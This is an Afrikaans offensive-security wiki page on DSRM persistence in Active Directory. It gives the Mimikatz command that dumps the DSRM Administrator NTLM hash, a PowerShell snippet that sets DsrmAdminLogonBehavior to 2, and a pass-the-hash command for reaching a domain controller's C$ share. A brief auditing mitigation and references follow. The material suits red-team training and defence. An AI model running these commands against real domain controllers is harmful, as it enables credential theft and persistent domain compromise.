# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting

Elke domeinbeheerder het 'n Directory Services Restore Mode (DSRM)-administrateurrekening. Die wagwoord word tydens domeinbeheerderbevordering gestel en is apart van Active Directory-domeinrekeninge.<sup>[[1]](#references)</sup>

'n Aanvaller met administratiewe beheer oor 'n domeinbeheerder kan die plaaslike SAM-databasis dump en die DSRM Administrator NTLM-hash herwin. Die volgende Mimikatz-opdrag voer daardie bewerking uit:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
By verstek is die DSRM-rekening bedoel vir herstelmodus. Deur `DsrmAdminLogonBehavior` op `2` te stel, kan hierdie plaaslike rekening staaf terwyl die domeinbeheerder normaal loop. Kontroleer die waarde voordat jy dit verander:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Die herstelde hash kan dan in 'n pass-the-hash-sessie gebruik word om toegang tot hulpbronne soos die administratiewe `C$`-share te verkry. Vir hierdie plaaslike rekening, gebruik die domeinbeheerder se rekenaarnaam as die `/domain`-waarde:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Versagting

- Oudit veranderinge aan `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Sekuriteitsgebeurtenis 4657 teken 'n registerwaarde-wysiging aan wanneer die sleutel se SACL gekonfigureer is om **Set Value**-bewerkings te oudit.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Stel die Directory Services Restore Mode-administrateurwagwoord terug](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Listige Active Directory-volharding #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Listige Active Directory-volharding #13 — DSRM-volharding v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Gebeurtenis 4657 — 'n Registerwaarde is gewysig](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
